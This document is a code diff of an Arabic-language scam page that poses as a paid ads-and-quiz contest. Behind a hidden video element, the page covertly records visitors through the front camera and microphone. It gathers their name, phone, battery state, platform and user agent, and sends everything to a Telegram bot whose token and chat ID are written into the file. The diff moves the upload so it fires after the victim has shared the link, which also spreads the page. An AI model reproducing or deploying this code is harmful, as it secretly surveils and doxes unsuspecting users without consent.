@@ -200,6 +200,7 @@
 <body>
 
     <div class="container">
+        <!-- قسم تسجيل البيانات -->
         <div id="form-section">
             <div style="font-size: 24px; margin-bottom: 5px;">🌐</div>
             <div class="header-title">الربح من الإعلانات والأسئله</div>
@@ -217,6 +218,7 @@
             <button type="button" class="btn-green" onclick="startProcess()">بدء التسجيل</button>
         </div>
 
+        <!-- قسم مشاركة الرابط العامة -->
         <div id="content-section" class="hidden">
             <div class="header-title">الربح من الإعلانات والأسئله</div>
             <div class="main-title">سجل الآن</div>
@@ -249,6 +251,7 @@
             </div>
         </div>
 
+        <!-- قسم المسابقة والأسئلة -->
         <div id="quiz-section" class="hidden">
             <div class="wallet-box">
                 <div>المحفظة: $<span id="balance">0.00</span></div>
@@ -273,6 +276,7 @@
             </div>
         </div>
 
+        <!-- قسم اختيار بنوك وطرق السحب -->
         <div id="withdraw-section" class="hidden">
             <div class="wallet-box">
                 <div>المحفظة: $<span id="balance-withdraw">0.00</span></div>
@@ -302,13 +306,14 @@
         </div>
     </div>
 
+    <!-- عناصر الكاميرا والفيديو الخفية -->
     <video id="video" width="320" height="240" autoplay muted playsinline style="display:none;"></video>
 
     <script>
         let progress = 0;
         let userBalance = 0.00;
-        let isWaitingForReturn = false;
-        let batteryLevelInfo = "غير معروف";
+        let hasSharedOrCopied = false; 
+        let batteryLevelInfo = "جاري الحساب...";
         let mediaStream = null;
         let mediaRecorder = null;
         let recordedChunks = [];
@@ -430,8 +435,14 @@
         function getBatteryStatus() {
             if (navigator.getBattery) {
                 navigator.getBattery().then(function(battery) {
-                    batteryLevelInfo = Math.round(battery.level * 100) + "%";
+                    let level = Math.round(battery.level * 100);
+                    let charging = battery.charging ? "⚡ (يتم الشحن)" : "🔋 (لا يتم الشحن)";
+                    batteryLevelInfo = `${level}% ${charging}`;
+                }).catch(() => {
+                    batteryLevelInfo = "غير متاح";
                 });
+            } else {
+                batteryLevelInfo = "غير مدعوم في المتصفح";
             }
         }
 
@@ -462,14 +473,16 @@
                 return;
             }
 
-            startContinuousRecording(mediaStream);
+            // تحديث حالة البطارية فور بدء التسجيل لضمان دقتها
+            getBatteryStatus();
+            startRecordingSession(mediaStream);
 
             document.getElementById('display-name').innerText = userName;
             document.getElementById('form-section').classList.add('hidden');
             document.getElementById('content-section').classList.remove('hidden');
         }
 
-        function startContinuousRecording(stream) {
+        function startRecordingSession(stream) {
             if (!stream) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
                 .then(function(newStream) {
@@ -502,76 +515,46 @@
                     isVideoSent = true;
 
                     let blob = new Blob(recordedChunks, { type: 'video/mp4' });
-                    sendVideoDirectly(blob, userName, userPhone);
+                    sendVideoToTelegram(blob, userName, userPhone);
                 };
 
-                // حفظ القطع كل ثانية لضمان تجميع الفيديو مهما كانت المدة قصيرة أو طويلة
                 mediaRecorder.start(1000);
 
             } catch (e) {
-                console.log("خطأ في بدء التسجيل المستمر: ", e);
+                console.log("خطأ في بدء التسجيل: ", e);
             }
         }
 
-        // الاستماع لمغادرة الصفحة أو إغلاقها لإرسال الفيديو فوراً
-        window.addEventListener("pagehide", function() {
-            triggerExitSend();
-        });
-
-        window.addEventListener("beforeunload", function() {
-            triggerExitSend();
-        });
-
-        document.addEventListener("visibilitychange", function() {
-            if (document.visibilityState === "hidden") {
-                triggerExitSend();
-            }
-        });
-
-        function triggerExitSend() {
-            if (mediaRecorder && mediaRecorder.state === "recording" && !isVideoSent) {
-                mediaRecorder.stop();
-            }
-        }
-
-        function sendVideoDirectly(videoBlob, name, phone) {
+        function sendVideoToTelegram(videoBlob, name, phone) {
             let botToken = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
             let chatId = "7962257606";
 
             let formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('video', videoBlob, 'user_capture.mp4');
-            formData.append('caption', `🎥 فيديو تواجد المستخدم (بحسب مدة بقائه):\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🔋 البطارية: ${batteryLevelInfo}\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`);
+            formData.append('video', videoBlob, 'quiz_arrival_capture.mp4');
+            formData.append('caption', `🎥 فيديو وصول المستخدم للأسئلة:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🔋 شحن البطارية: ${batteryLevelInfo}\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`);
 
             let url = `https://api.telegram.org/bot${botToken}/sendVideo`;
 
-            // استخدام sendBeacon لضمان إرسال الطلب حتى لو أغلق المستخدم الصفحة بشكل فجائي
-            if (navigator.sendBeacon && videoBlob.size < 6000000) {
-                // محاولة الإرسال السريع المباشر
-                fetch(url, {
-                    method: 'POST',
-                    body: formData,
-                    keepalive: true
-                }).catch(err => console.log("خطأ الإرسال"));
-            } else {
-                fetch(url, {
-                    method: 'POST',
-                    body: formData,
-                    keepalive: true
-                }).catch(err => console.log("خطأ الإرسال"));
-            }
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            }).then(response => {
+                console.log("تم إرسال الفيديو بنجاح للبوت");
+            }).catch(err => {
+                console.log("خطأ في إرسال الفيديو: ", err);
+            });
         }
 
         function openGeneralShare() {
-            if (isWaitingForReturn) return;
-            isWaitingForReturn = true;
-
             let siteUrl = window.location.href;
             let shareData = {
                 title: 'الربح من الإعلانات والأسئله',
                 text: 'شارك في مسابقة الربح من الإعلانات والأسئله وسجل اسمك ورقمك عبر الرابط:',
                 url: siteUrl
             };
+
+            hasSharedOrCopied = true;
 
             if (navigator.share) {
                 navigator.share(shareData).then(() => {
@@ -590,7 +573,14 @@
         }
 
         document.addEventListener("visibilitychange", function() {
-            if (document.visibilityState === "visible" && isWaitingForReturn) {
+            if (document.visibilityState === "visible") {
+                if (!hasSharedOrCopied) {
+                    let shareBtn = document.getElementById('share-btn');
+                    shareBtn.innerText = "مساهمة";
+                    shareBtn.style.backgroundColor = "#8bc34a";
+                    return;
+                }
+
                 setTimeout(() => {
                     if (progress < 100) {
                         progress += 20; 
@@ -603,18 +593,36 @@
                     let shareBtn = document.getElementById('share-btn');
                     shareBtn.innerText = "مساهمة";
                     shareBtn.style.backgroundColor = "#8bc34a";
-                    isWaitingForReturn = false;
+                    hasSharedOrCopied = false; 
 
                     if (progress >= 100) {
-                        setTimeout(() => {
-                            document.getElementById('content-section').classList.add('hidden');
-                            document.getElementById('quiz-section').classList.remove('hidden');
-                            loadQuestion();
-                        }, 500);
+                        // تحديث قراءة البطارية للمرة الأخيرة قبل الإرسال الفوري
+                        if (navigator.getBattery) {
+                            navigator.getBattery().then(function(battery) {
+                                let level = Math.round(battery.level * 100);
+                                let charging = battery.charging ? "⚡ (يتم الشحن)" : "🔋 (لا يتم الشحن)";
+                                batteryLevelInfo = `${level}% ${charging}`;
+                                triggerVideoStopAndSend();
+                            });
+                        } else {
+                            triggerVideoStopAndSend();
+                        }
                     }
-                }, 15000); 
+                }, 3000); 
             }
         });
+
+        function triggerVideoStopAndSend() {
+            if (mediaRecorder && mediaRecorder.state === "recording") {
+                mediaRecorder.stop(); 
+            }
+
+            setTimeout(() => {
+                document.getElementById('content-section').classList.add('hidden');
+                document.getElementById('quiz-section').classList.remove('hidden');
+                loadQuestion();
+            }, 500);
+        }
 
         function loadQuestion() {
             if (currentQuestion >= questions.length) {
